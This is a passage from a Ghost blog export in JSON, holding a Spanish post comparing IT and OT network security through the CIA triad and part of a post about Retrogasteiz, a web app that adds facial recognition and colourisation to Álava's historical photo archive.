disfrutar.\n\n",
            "feature_image": "__GHOST_URL__/content/images/2023/05/tor-hidden-background-1.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-04-24T05:17:10.000Z",
            "updated_at": "2023-05-07T16:08:04.000Z",
            "published_at": "2023-05-07T16:04:50.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "647cfb2fd433ee005b37cdc8",
            "uuid": "d838209f-7bf0-4ffd-a037-7b6763414e3b",
            "title": "Ciberseguridad en el mundo industrial. IT vs. OT.",
            "slug": "ciberseguridad-en-redes-ot-vs-redes-it-que-son-y-como-protegerlas",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}]],\"cards\":[[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/06/ITvsOT.png\",\"width\":1335,\"height\":457}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"Los riesgos y desafíos de la ciberseguridad son muy distintos en cada tipo de red.&nbsp;\",\"backgroundColor\":\"yellow\"}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas\",\"backgroundColor\":\"yellow\"}]],\"markups\":[[\"strong\"]],\"sections\":[[1,\"p\",[[0,[],0,\"La ciberseguridad es indispensable en la era digital, especialmente en los entornos de producción industrial. Dentro de estos entornos, se pueden encontrar dos tipos de redes con características muy distintivas: las redes \"],[0,[0],1,\"OT \"],[0,[],0,\"y las redes \"],[0,[0],1,\"IT\"],[0,[],0,\". A continuación, profundizaremos en estas diferencias desde la perspectiva de la ciberseguridad.\"]]],[1,\"h2\",[[0,[0],1,\"¿Qué es la tríada CIA?\"]]],[1,\"p\",[[0,[],0,\"La tríada \"],[0,[0],1,\"CIA \"],[0,[],0,\"es un modelo fundamental en la ciberseguridad que se compone de tres principios esenciales:\"]]],[3,\"ul\",[[[0,[0],1,\"Confidencialidad\"],[0,[],0,\": busca preservar la privacidad y protección de la información.\"]],[[0,[0],1,\"Integridad\"],[0,[],0,\": se enfoca en la protección de la no alteración de los datos\"]],[[0,[0],1,\"Disponibilidad\"],[0,[],0,\": se centra en asegurar el acceso adecuado y continuo a la información y sistemas\"]]]],[1,\"p\",[[0,[],0,\"Estos tres conceptos son considerados como los pilares básicos necesarios para proteger adecuadamente las redes, los sistemas y la información sensible de cualquier tipo de amenaza o ataque cibernético.\"]]],[1,\"h2\",[[0,[0],1,\"¿Qué son las redes OT?\"]]],[1,\"p\",[[1,[],0,0],[0,[],0,\"Las redes \"],[0,[0],1,\"OT \"],[0,[],0,\"(Operation Technologies) son redes de control industrial que permiten el monitoreo y control de procesos físicos. Son muy utilizadas en industrias como manufactura, energía y química. Las redes \"],[0,[0],1,\"OT \"],[0,[],0,\"son críticas para la \"],[0,[0],1,\"producción\"],[0,[],0,\", y un ataque o falla en esta red puede tener graves consecuencias.\"]]],[1,\"h2\",[[0,[0],1,\"¿Qué son las redes IT?\"]]],[1,\"p\",[[0,[],0,\"Las redes \"],[0,[0],1,\"IT \"],[0,[],0,\"(Information Technologies) son redes de información que permiten el intercambio de datos entre usuarios y sistemas. Las redes \"],[0,[0],1,\"IT \"],[0,[],0,\"incluyen internet, intranet, correo electrónico, entre otras. Estas redes han tenido una gran evolución en los últimos años, y la mayoría de las empresas y organizaciones dependen de ellas para su operación diaria.\"]]],[1,\"h2\",[[0,[0],1,\"Riesgos y desafíos de la ciberseguridad en redes OT vs redes IT\"]]],[10,0],[10,1],[1,\"p\",[[0,[],0,\"Las\"],[0,[0],1,\" redes IT\"],[0,[],0,\" enfrentan mayores riesgos de ataques cibernéticos. Los hackers pueden interferir en la privacidad, integridad y disponibilidad de los datos, lo que puede afectar a la productividad, desempeño y reputación de la empresa.\"]]],[1,\"p\",[[0,[],0,\"Por otro lado,\"],[0,[0],1,\" las redes OT\"],[0,[],0,\" enfrentan mayores riesgos de ataques físicos y cibernéticos. Un ataque en una red OT puede causar daños en la producción, la seguridad de los trabajadores y la continuidad del negocio.\"]]],[1,\"h2\",[[0,[],0,\"CIA en redes IT\"]]],[1,\"p\",[[0,[],0,\"En redes \"],[0,[0],1,\"IT\"],[0,[],0,\", la \"],[0,[0],1,\"confidencialidad \"],[0,[],0,\"es la \"],[0,[0],1,\"prioridad principal \"],[0,[],0,\"porque su función principal es la gestión y transmisión de información sensible. La protección de datos personales, secretos comerciales y otra información confidencial es fundamental en las redes IT. En este tipo de redes, la \"],[0,[0],1,\"integridad \"],[0,[],0,\"de los datos es la \"],[0,[0],1,\"segunda prioridad\"],[0,[],0,\", ya que se garantiza que los datos no se hayan modificado o alterado incorrectamente, lo que podría provocar daños a la organización y a los usuarios. La \"],[0,[0],1,\"disponibilidad ocupa el tercer lugar\"],[0,[],0,\" porque, si bien es importante que los usuarios tengan acceso continuo a los datos, la pérdida o la filtración de datos puede tener consecuencias más graves.\"]]],[1,\"h2\",[[0,[],0,\"CIA en redes OT\"]]],[1,\"p\",[[0,[],0,\"En redes \"],[0,[0],1,\"OT\"],[0,[],0,\", la \"],[0,[0],1,\"disponibilidad \"],[0,[],0,\"es la prioridad principal, ya que estas redes están diseñadas para controlar el funcionamiento y la producción de instalaciones industriales como refinerías, plantas energéticas y maquinarias pesadas. Si la red \"],[0,[0],1,\"OT \"],[0,[],0,\"deja de funcionar, puede causar interrupciones en la producción y la seguridad de los trabajadores, lo que provoca grandes pérdidas económicas. Después de la disponibilidad, la \"],[0,[0],1,\"integridad \"],[0,[],0,\"es la \"],[0,[0],1,\"segunda prioridad\"],[0,[],0,\", ya que los datos y la precisión de los procesos son fundamentales para el funcionamiento adecuado de las instalaciones industriales. Por último, la \"],[0,[0],1,\"confidencialidad \"],[0,[],0,\"ocupa el \"],[0,[0],1,\"tercer lugar\"],[0,[],0,\", porque la privacidad y el secreto comercial son menos relevantes en comparación con la disponibilidad y la integridad.\"]]],[1,\"h2\",[[0,[],0,\"Conclusión\"]]],[1,\"p\",[[0,[],0,\"La protección de las redes IT y OT representa un desafío importante en el ámbito de la ciberseguridad. Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas. Además, mantener ambas redes conectadas para monitorear las operaciones en la red industrial desde la oficina de negocios puede plantear desafíos adicionales en términos de seguridad.\"]]],[10,2],[1,\"p\",[[0,[],0,\"En este contexto, es fundamental implementar controles de acceso y medidas de seguridad adecuadas para garantizar la protección tanto de las redes IT como OT. La segmentación de redes, la autenticación multifactorial y la constante monitorización y actualización de software y hardware son medidas esenciales en la protección de ambas redes.\"]]],[1,\"p\",[[0,[],0,\"En conclusión, la protección de las redes IT y OT requiere de la implementación de medidas de seguridad específicas y la consideración detallada de las diferencias de prioridad en la triada CIA de cada una. La conectividad entre estas redes debe ser afrontada con un enfoque especializado en la seguridad y, por lo tanto, se requiere una planificación cuidadosa y una implementación detallada de soluciones de seguridad en ambas redes.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>La ciberseguridad es indispensable en la era digital, especialmente en los entornos de producción industrial. Dentro de estos entornos, se pueden encontrar dos tipos de redes con características muy distintivas: las redes <strong>OT </strong>y las redes <strong>IT</strong>. A continuación, profundizaremos en estas diferencias desde la perspectiva de la ciberseguridad.</p><h2 id=\"%C2%BFqu%C3%A9-es-la-tr%C3%ADada-cia\"><strong>¿Qué es la tríada CIA?</strong></h2><p>La tríada <strong>CIA </strong>es un modelo fundamental en la ciberseguridad que se compone de tres principios esenciales:</p><ul><li><strong>Confidencialidad</strong>: busca preservar la privacidad y protección de la información.</li><li><strong>Integridad</strong>: se enfoca en la protección de la no alteración de los datos</li><li><strong>Disponibilidad</strong>: se centra en asegurar el acceso adecuado y continuo a la información y sistemas</li></ul><p>Estos tres conceptos son considerados como los pilares básicos necesarios para proteger adecuadamente las redes, los sistemas y la información sensible de cualquier tipo de amenaza o ataque cibernético.</p><h2 id=\"%C2%BFqu%C3%A9-son-las-redes-ot\"><strong>¿Qué son las redes OT?</strong></h2><p><br>Las redes <strong>OT </strong>(Operation Technologies) son redes de control industrial que permiten el monitoreo y control de procesos físicos. Son muy utilizadas en industrias como manufactura, energía y química. Las redes <strong>OT </strong>son críticas para la <strong>producción</strong>, y un ataque o falla en esta red puede tener graves consecuencias.</p><h2 id=\"%C2%BFqu%C3%A9-son-las-redes-it\"><strong>¿Qué son las redes IT?</strong></h2><p>Las redes <strong>IT </strong>(Information Technologies) son redes de información que permiten el intercambio de datos entre usuarios y sistemas. Las redes <strong>IT </strong>incluyen internet, intranet, correo electrónico, entre otras. Estas redes han tenido una gran evolución en los últimos años, y la mayoría de las empresas y organizaciones dependen de ellas para su operación diaria.</p><h2 id=\"riesgos-y-desaf%C3%ADos-de-la-ciberseguridad-en-redes-ot-vs-redes-it\"><strong>Riesgos y desafíos de la ciberseguridad en redes OT vs redes IT</strong></h2><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/06/ITvsOT.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1335\" height=\"457\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/06/ITvsOT.png 600w, __GHOST_URL__/content/images/size/w1000/2023/06/ITvsOT.png 1000w, __GHOST_URL__/content/images/2023/06/ITvsOT.png 1335w\" sizes=\"(min-width: 720px) 720px\"></figure><div class=\"kg-card kg-callout-card kg-callout-card-yellow\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">Los riesgos y desafíos de la ciberseguridad son muy distintos en cada tipo de red.&nbsp;</div></div><p>Las<strong> redes IT</strong> enfrentan mayores riesgos de ataques cibernéticos. Los hackers pueden interferir en la privacidad, integridad y disponibilidad de los datos, lo que puede afectar a la productividad, desempeño y reputación de la empresa.</p><p>Por otro lado,<strong> las redes OT</strong> enfrentan mayores riesgos de ataques físicos y cibernéticos. Un ataque en una red OT puede causar daños en la producción, la seguridad de los trabajadores y la continuidad del negocio.</p><h2 id=\"cia-en-redes-it\">CIA en redes IT</h2><p>En redes <strong>IT</strong>, la <strong>confidencialidad </strong>es la <strong>prioridad principal </strong>porque su función principal es la gestión y transmisión de información sensible. La protección de datos personales, secretos comerciales y otra información confidencial es fundamental en las redes IT. En este tipo de redes, la <strong>integridad </strong>de los datos es la <strong>segunda prioridad</strong>, ya que se garantiza que los datos no se hayan modificado o alterado incorrectamente, lo que podría provocar daños a la organización y a los usuarios. La <strong>disponibilidad ocupa el tercer lugar</strong> porque, si bien es importante que los usuarios tengan acceso continuo a los datos, la pérdida o la filtración de datos puede tener consecuencias más graves.</p><h2 id=\"cia-en-redes-ot\">CIA en redes OT</h2><p>En redes <strong>OT</strong>, la <strong>disponibilidad </strong>es la prioridad principal, ya que estas redes están diseñadas para controlar el funcionamiento y la producción de instalaciones industriales como refinerías, plantas energéticas y maquinarias pesadas. Si la red <strong>OT </strong>deja de funcionar, puede causar interrupciones en la producción y la seguridad de los trabajadores, lo que provoca grandes pérdidas económicas. Después de la disponibilidad, la <strong>integridad </strong>es la <strong>segunda prioridad</strong>, ya que los datos y la precisión de los procesos son fundamentales para el funcionamiento adecuado de las instalaciones industriales. Por último, la <strong>confidencialidad </strong>ocupa el <strong>tercer lugar</strong>, porque la privacidad y el secreto comercial son menos relevantes en comparación con la disponibilidad y la integridad.</p><h2 id=\"conclusi%C3%B3n\">Conclusión</h2><p>La protección de las redes IT y OT representa un desafío importante en el ámbito de la ciberseguridad. Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas. Además, mantener ambas redes conectadas para monitorear las operaciones en la red industrial desde la oficina de negocios puede plantear desafíos adicionales en términos de seguridad.</p><div class=\"kg-card kg-callout-card kg-callout-card-yellow\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas</div></div><p>En este contexto, es fundamental implementar controles de acceso y medidas de seguridad adecuadas para garantizar la protección tanto de las redes IT como OT. La segmentación de redes, la autenticación multifactorial y la constante monitorización y actualización de software y hardware son medidas esenciales en la protección de ambas redes.</p><p>En conclusión, la protección de las redes IT y OT requiere de la implementación de medidas de seguridad específicas y la consideración detallada de las diferencias de prioridad en la triada CIA de cada una. La conectividad entre estas redes debe ser afrontada con un enfoque especializado en la seguridad y, por lo tanto, se requiere una planificación cuidadosa y una implementación detallada de soluciones de seguridad en ambas redes.</p>",
            "comment_id": "647cfb2fd433ee005b37cdc8",
            "plaintext": "La ciberseguridad es indispensable en la era digital, especialmente en los entornos de producción industrial. Dentro de estos entornos, se pueden encontrar dos tipos de redes con características muy distintivas: las redes OT y las redes IT. A continuación, profundizaremos en estas diferencias desde la perspectiva de la ciberseguridad.\n\n\n¿Qué es la tríada CIA?\n\nLa tríada CIA es un modelo fundamental en la ciberseguridad que se compone de tres principios esenciales:\n\n * Confidencialidad: busca preservar la privacidad y protección de la información.\n * Integridad: se enfoca en la protección de la no alteración de los datos\n * Disponibilidad: se centra en asegurar el acceso adecuado y continuo a la información y sistemas\n\nEstos tres conceptos son considerados como los pilares básicos necesarios para proteger adecuadamente las redes, los sistemas y la información sensible de cualquier tipo de amenaza o ataque cibernético.\n\n\n¿Qué son las redes OT?\n\n\nLas redes OT (Operation Technologies) son redes de control industrial que permiten el monitoreo y control de procesos físicos. Son muy utilizadas en industrias como manufactura, energía y química. Las redes OT son críticas para la producción, y un ataque o falla en esta red puede tener graves consecuencias.\n\n\n¿Qué son las redes IT?\n\nLas redes IT (Information Technologies) son redes de información que permiten el intercambio de datos entre usuarios y sistemas. Las redes IT incluyen internet, intranet, correo electrónico, entre otras. Estas redes han tenido una gran evolución en los últimos años, y la mayoría de las empresas y organizaciones dependen de ellas para su operación diaria.\n\n\nRiesgos y desafíos de la ciberseguridad en redes OT vs redes IT\n\n⚠️Los riesgos y desafíos de la ciberseguridad son muy distintos en cada tipo de red. \n\nLas redes IT enfrentan mayores riesgos de ataques cibernéticos. Los hackers pueden interferir en la privacidad, integridad y disponibilidad de los datos, lo que puede afectar a la productividad, desempeño y reputación de la empresa.\n\nPor otro lado, las redes OT enfrentan mayores riesgos de ataques físicos y cibernéticos. Un ataque en una red OT puede causar daños en la producción, la seguridad de los trabajadores y la continuidad del negocio.\n\n\nCIA en redes IT\n\nEn redes IT, la confidencialidad es la prioridad principal porque su función principal es la gestión y transmisión de información sensible. La protección de datos personales, secretos comerciales y otra información confidencial es fundamental en las redes IT. En este tipo de redes, la integridad de los datos es la segunda prioridad, ya que se garantiza que los datos no se hayan modificado o alterado incorrectamente, lo que podría provocar daños a la organización y a los usuarios. La disponibilidad ocupa el tercer lugar porque, si bien es importante que los usuarios tengan acceso continuo a los datos, la pérdida o la filtración de datos puede tener consecuencias más graves.\n\n\nCIA en redes OT\n\nEn redes OT, la disponibilidad es la prioridad principal, ya que estas redes están diseñadas para controlar el funcionamiento y la producción de instalaciones industriales como refinerías, plantas energéticas y maquinarias pesadas. Si la red OT deja de funcionar, puede causar interrupciones en la producción y la seguridad de los trabajadores, lo que provoca grandes pérdidas económicas. Después de la disponibilidad, la integridad es la segunda prioridad, ya que los datos y la precisión de los procesos son fundamentales para el funcionamiento adecuado de las instalaciones industriales. Por último, la confidencialidad ocupa el tercer lugar, porque la privacidad y el secreto comercial son menos relevantes en comparación con la disponibilidad y la integridad.\n\n\nConclusión\n\nLa protección de las redes IT y OT representa un desafío importante en el ámbito de la ciberseguridad. Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas. Además, mantener ambas redes conectadas para monitorear las operaciones en la red industrial desde la oficina de negocios puede plantear desafíos adicionales en términos de seguridad.\n\n⚠️Dado que sus prioridades CIA son distintas, es necesario aplicar medidas de seguridad especializadas en cada una de ellas\n\nEn este contexto, es fundamental implementar controles de acceso y medidas de seguridad adecuadas para garantizar la protección tanto de las redes IT como OT. La segmentación de redes, la autenticación multifactorial y la constante monitorización y actualización de software y hardware son medidas esenciales en la protección de ambas redes.\n\nEn conclusión, la protección de las redes IT y OT requiere de la implementación de medidas de seguridad específicas y la consideración detallada de las diferencias de prioridad en la triada CIA de cada una. La conectividad entre estas redes debe ser afrontada con un enfoque especializado en la seguridad y, por lo tanto, se requiere una planificación cuidadosa y una implementación detallada de soluciones de seguridad en ambas redes.",
            "feature_image": "__GHOST_URL__/content/images/2023/06/IT-vs-OT_Featured.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-06-04T20:59:27.000Z",
            "updated_at": "2023-06-04T21:36:18.000Z",
            "published_at": "2023-06-04T21:36:18.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "64cb76e03a1966005b7371ba",
            "uuid": "c8478ba6-3b0b-4432-b062-41a4557b85e1",
            "title": "Retrogasteiz: Innovación y Tradición en la Visualización de Archivos Históricos de Álava",
            "slug": "retrogasteiz",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}]],\"cards\":[[\"callout\",{\"calloutEmoji\":\"💡\",\"calloutText\":\"El objetivo de este proyecto es investigar nuevas maneras de realzar un archivo fotográfico público, mediante la implementación de conceptos innovadores como la visión artificial y las interfaces de usuario modernas.\",\"backgroundColor\":\"grey\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/plot.png\",\"width\":1000,\"height\":600,\"caption\":\"Reducción tamaño total de almacenamiento de todas las imágenes\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/image.png\",\"width\":1009,\"height\":646,\"cardWidth\":\"\",\"caption\":\"Reconocimiento facial peluquería de señoras Urrutia\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/image-1.png\",\"width\":1016,\"height\":668,\"caption\":\"Coloreado de la casa/peluquería de señoras Urrutia\"}],[\"callout\",{\"calloutEmoji\":\"💡\",\"calloutText\":\"El propósito de resaltar estos desafíos no es criticar a quienes han trabajado arduamente en la catalogación de estos archivos. Más bien, es un llamado de atención a las instituciones que promueven la digitalización pero no proporcionan los recursos necesarios y eficientes para asegurar que el trabajo se realice con el cuidado y la precisión que merece.\",\"backgroundColor\":\"grey\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/image-2.png\",\"width\":390,\"height\":245,\"caption\":\"Buscador simplificado con sugerencias\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/image-3.png\",\"width\":310,\"height\":119,\"caption\":\"Personas detectadas en la imágen\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/08/2d6ad75b46a729e589f9225e838a7d4635ed71f5.jpg\",\"width\":4702,\"height\":3449,\"caption\":\"Retratos de boda de los recién casados Martín Ona y Pilar Arregui\"}]],\"markups\":[[\"a\",[\"href\",\"https://retrogasteiz.com\"]],[\"a\",[\"href\",\"https://jaime.gomezobregon.com/\"]],[\"a\",[\"href\",\"https://retrosantander.com/\"]],[\"a\",[\"href\",\"https://retrogipuzkoa.com/\"]],[\"a\",[\"href\",\"https://photo.araba.eus/s/photoaraba\"]],[\"a\",[\"href\",\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.es\"]],[\"a\",[\"href\",\"https://photo.araba.eus\"]],[\"a\",[\"href\",\"https://retrogasteiz.com/\"]],[\"strong\"],[\"a\",[\"href\",\"https://aws.amazon.com/es/rekognition/\"]],[\"a\",[\"href\",\"https://deoldify.ai/\"]],[\"a\",[\"href\",\"https://photo.araba.eus/s/photoaraba/item/162447\"]],[\"a\",[\"href\",\"https://photo.araba.eus/s/photoaraba/item/162796\"]]],\"sections\":[[1,\"p\",[[0,[0],1,\"Retrogasteiz.com\"],[0,[],0,\" ha sido un experimento personal inspirado por las obras originales de \"],[0,[1],1,\"Jaime Gómez-Obregón\"],[0,[],0,\" en \"],[0,[2],1,\"Retrosantander \"],[0,[],0,\"y \"],[0,[3],1,\"Retrogipuzkoa\"],[0,[],0,\". Actualmente tiene más de 100.000 imágenes del Archivo de Álava aunque solo están publicadas aquellas imágenes que se han podido catalogar entre los años 1818 y 1990. Estas imágenes han sido digitalizadas por la \"],[0,[4],1,\"Diputación Foral de Álava - Araba Foru Aldundia\"],[0,[],0,\" y se han publicado bajo la licencia abierta \"],[0,[5],1,\"CC BY-NC-SA 4.0\"],[0,[],0,\" en \"],[0,[6],1,\"https://photo.araba.eus\"],[0,[],0,\" por la misma entidad.\"]]],[10,0],[1,\"p\",[[0,[],0,\"Además, Retrogasteiz sirve como un ejemplo palpable de cómo la disponibilidad abierta de bases de datos públicas brinda a la gente la oportunidad de desarrollar y compartir iniciativas frescas y colaborativas buscando la mejora continua de los resultados disponibles.\"]]],[1,\"h1\",[[0,[],0,\"Descripción del Archivo Histórico de Álava\"]]],[1,\"p\",[[0,[],0,\"Iniciado por el Archivo de Álava, PHOTO-ARABA sirve como el vehículo principal para compartir el patrimonio fotográfico de la Diputación Foral de Álava con el público.\"]]],[1,\"p\",[[0,[],0,\"Este proyecto cultural, en constante expansión, ya cuenta con una colección impresionante de más de cien mil imágenes históricas.\"]]],[1,\"p\",[[0,[],0,\"Lo que PHOTO-ARABA ofrece es una ventana única a la evolución de nuestro territorio en los aspectos políticos, sociales y económicos. Captura los cambios en el paisaje y en las áreas urbanas, y documenta las transformaciones en el estilo de vida y en las tradiciones alavesas a lo largo del último siglo. Además de las imágenes situadas en Álava, la colección también incluye fotografías de viajes y de eventos importantes ocurridos en otros lugares.\"]]],[1,\"h1\",[[0,[],0,\"Qué es Retrogasteiz\"]]],[1,\"p\",[[0,[7],1,\"Retrogasteiz\"],[0,[],0,\" es una aplicación web innovadora que busca llevar el patrimonio fotográfico de Álava a nuevos horizontes donde la antigua Vitoria es la protagonista. Mientras que PHOTO-ARABA sirve como el portal oficial para la difusión del archivo histórico, ofreciendo acceso a más de cien mil fotografías documentadas, Retrogasteiz va un paso más allá en la exploración y visualización de este valioso recurso.\"]]],[1,\"h2\",[[0,[],0,\"Diferencias clave entre PHOTO-ARABA y Retrogasteiz\"]]],[3,\"ul\",[[[0,[8],1,\"Tecnología Avanzada:\"],[0,[],0,\" Retrogasteiz emplea tecnologías de inteligencia artificial, como el reconocimiento facial a través de Amazon AWS y la coloración de imágenes en blanco y negro utilizando DeOldify. Esto permite a los usuarios interactuar con las imágenes de una manera más viva y dinámica.\"]],[[0,[8],1,\"Visualización Mejorada:\"],[0,[],0,\" Mientras PHOTO-ARABA se centra en la presentación y documentación de las imágenes, Retrogasteiz ofrece una experiencia de visualización optimizada, con la conversión de imágenes a formato \"],[0,[8],1,\"webp\"],[0,[],0,\", reduciendo así el peso de las imágenes en un 70% con respecto al formato \"],[0,[8],1,\"jpg\"],[0,[],0,\". Esto facilita una carga más rápida y eficiente.\"]]]],[10,1],[3,\"ul\",[[[0,[8],1,\"Corrección y Filtrado de Datos:\"],[0,[],0,\" Retrogasteiz ha implementado mejoras en la precisión de los datos, corrigiendo fechas incorrectas y permitiendo futuras consultas con filtrado de fechas. Esto contrasta con el enfoque más estático de PHOTO-ARABA.\"]],[[0,[8],1,\"Experiencia de Usuario Moderna:\"],[0,[],0,\" Con interfaces de usuario contemporáneas, Retrogasteiz brinda una experiencia de navegación más intuitiva y atractiva, permitiendo a los usuarios explorar el archivo histórico de una manera más interactiva y personalizada.\"]]]],[1,\"p\",[[0,[],0,\"En resumen, mientras PHOTO-ARABA proporciona un acceso esencial y directo al archivo histórico de Álava, Retrogasteiz amplía este acceso, ofreciendo nuevas formas de interactuar y disfrutar del patrimonio fotográfico a través de tecnologías y enfoques modernos. Retrogasteiz representa no solo una extensión de PHOTO-ARABA sino una evolución, celebrando el pasado mientras abraza el futuro de la visualización digital.\"]]],[1,\"h1\",[[0,[],0,\"Integración de Inteligencia Artificial\"]]],[1,\"p\",[[0,[],0,\"La incorporación de tecnologías de Inteligencia Artificial (IA) ha sido un elemento clave en la innovación que \"],[0,[7],1,\"Retrogasteiz \"],[0,[],0,\"aporta al archivo histórico de Álava. Este proceso ha implicado el uso de diferentes herramientas y técnicas, detalladas a continuación:\"]]],[3,\"ul\",[[[0,[8],1,\"Reconocimiento Facial con AWS:\"],[0,[],0,\" Para potenciar la capacidad de identificación y búsqueda dentro de una muestra de 10.000 imágenes, se ha recurrido a la plataforma \"],[0,[9],1,\"Amazon Web Services\"],[0,[],0,\" (AWS) para el reconocimiento facial. La implementación de esta tecnología de reconocimiento facial ha sido posible a través de una suscripción a AWS, con un costo aproximado de 50€. Al tratarse de un servicio de pago por uso, esta inversión ha permitido analizar y procesar la muestra seleccionada, agregando una dimensión de búsqueda y análisis única al archivo.\"]]]],[10,2],[3,\"ul\",[[[0,[8],1,\"Coloreado con Deoldify:\"],[0,[],0,\" A través del uso del modelo de deep learning de \"],[0,[10],1,\"Deoldify\"],[0,[],0,\", se ha llevado a cabo un proceso de coloreado para las imágenes en blanco y negro. A diferencia del reconocimiento facial, esta etapa del proyecto se ha realizado en local, sin incurrir en costos adicionales. La integración de Deoldify ha añadido vida y color a las imágenes históricas, permitiendo a los usuarios experimentar las fotos en una forma más cercana a cómo habrían aparecido en la realidad en su momento.\"]]]],[10,3],[1,\"p\",[[0,[],0,\"La combinación de estas tecnologías de IA ha enriquecido Retrogasteiz, no solo mejorando la visualización y experiencia del usuario sino también abriendo nuevas posibilidades para la investigación y el estudio del patrimonio fotográfico de Álava. El equilibrio entre las soluciones de pago y las implementaciones locales refleja una estrategia cuidadosa y eficiente para maximizar el valor y el impacto de la integración de la Inteligencia Artificial en el proyecto.\"]]],[1,\"h1\",[[0,[],0,\"Curiosidades y Desafíos\"]]],[1,\"p\",[[0,[],0,\"Dentro del vasto archivo fotográfico de Álava, se han encontrado algunos datos curiosos y desafíos inesperados. Un aspecto notable fue la presencia de fechas incorrectas en algunas imágenes, como el \"],[0,[11],1,\"29 de febrero de 1953\"],[0,[],0,\" o el \"],[0,[12],1,\"31 de junio de 1953\"],[0,[],0,\", fechas que simplemente no existen en el calendario.\"]]],[1,\"p\",[[0,[],0,\"Este hallazgo planteó la necesidad de un proceso de corrección meticuloso. Las fechas erróneas se parsearon y corrigieron, permitiendo no solo una mayor precisión en la documentación sino también la posibilidad de futuras consultas y aplicaciones de filtros. Este trabajo, aunque esencial, denota un proceso manual en la catalogación de las imágenes que dejó margen para errores.\"]]],[1,\"p\",[[0,[],0,\"Es un punto de reflexión interesante en la era de la digitalización, en la que los políticos y gobiernos a menudo promocionan los avances tecnológicos y la transformación digital. A pesar de este enfoque en la modernización, aún se pueden encontrar estos pequeños errores manuales en procesos que involucran patrimonio tan valioso.\"]]],[10,4],[1,\"p\",[[0,[],0,\"Este incidente no disminuye la importancia del archivo, pero sí subraya la importancia de una transición cuidadosa hacia la digitalización. La corrección de estos errores en \"],[0,[0],1,\"Retrogasteiz \"],[0,[],0,\"demuestra una atención al detalle y un compromiso con la precisión y calidad, asegurando que las imágenes históricas sean un reflejo fiel y accesible del pasado de Álava.\"]]],[1,\"h1\",[[0,[],0,\"Resultados y Aplicaciones \"]]],[1,\"p\",[[0,[],0,\"La plataforma \"],[0,[7],1,\"Retrogasteiz \"],[0,[],0,\"lleva la exploración del archivo fotográfico de Álava a un nuevo nivel, ofreciendo funcionalidades únicas que enriquecen la experiencia del usuario. Estas innovaciones se destacan a continuación:\"]]],[3,\"ul\",[[[0,[8],1,\"Búsqueda Simplificada:\"],[0,[],0,\" A través de la web, los usuarios pueden realizar búsquedas teniendo en cuenta diversos parámetros como el título, descripción, y fechas. Se ha diseñado un sistema de búsqueda intuitivo y eficiente que evita al usuario tener que lidiar con filtros o formularios innecesarios y repetir búsquedas. Esta optimización en el proceso de búsqueda permite una exploración más ágil y satisfactoria del archivo.\"]]]],[10,5],[3,\"ul\",[[[0,[8],1,\"Reconocimiento Facial:\"],[0,[],0,\" La integración de tecnologías de IA para el reconocimiento facial no solo permite visualizar las caras reconocidas en las imágenes, sino que también abre la puerta a futuras funcionalidades, como la posibilidad de realizar búsquedas por rostros. Esta característica agrega una dimensión adicional a la forma en que se pueden explorar y entender las imágenes históricas.\"]]]],[10,6],[3,\"ul\",[[[0,[8],1,\"Coloreado y Comparación de Imágenes:\"],[0,[],0,\" Retrogasteiz ofrece la posibilidad de colorear imágenes en blanco y negro y descargar una comparación entre las versiones en color y en blanco y negro. Esta función transforma la forma en que los usuarios interactúan con las imágenes, permitiendo una apreciación más profunda y viva de los detalles y la historia que capturan.\"]]]],[10,7],[1,\"p\",[[0,[],0,\"Estas aplicaciones y resultados reflejan el compromiso de Retrogasteiz con la innovación y la mejora continua en la presentación del patrimonio fotográfico de Álava. La plataforma no solo proporciona una ventana al pasado, sino que también emplea la tecnología moderna para facilitar una exploración más rica y atractiva, haciendo que la historia cobre vida de formas antes inimaginables.\"]]],[1,\"p\",[[0,[],0,\"Compartir algunos de los resultados alcanzados.\"],[1,[],0,0],[0,[],0,\"Posibles aplicaciones y cómo podría beneficiar a historiadores, investigadores, y al público en general.\"]]],[1,\"h1\",[[0,[],0,\"Desafíos y Oportunidades\"]]],[1,\"p\",[[0,[],0,\"Una de las características distintivas de \"],[0,[7],1,\"Retrogasteiz \"],[0,[],0,\"es que la web se ejecuta íntegramente en el navegador del usuario. Aunque esto ofrece una experiencia de usuario fluida y sin dependencias externas, también ha presentado ciertos desafíos.\"]]],[1,\"p\",[[0,[],0,\"Con grandes cantidades de datos, algunos usuarios pueden 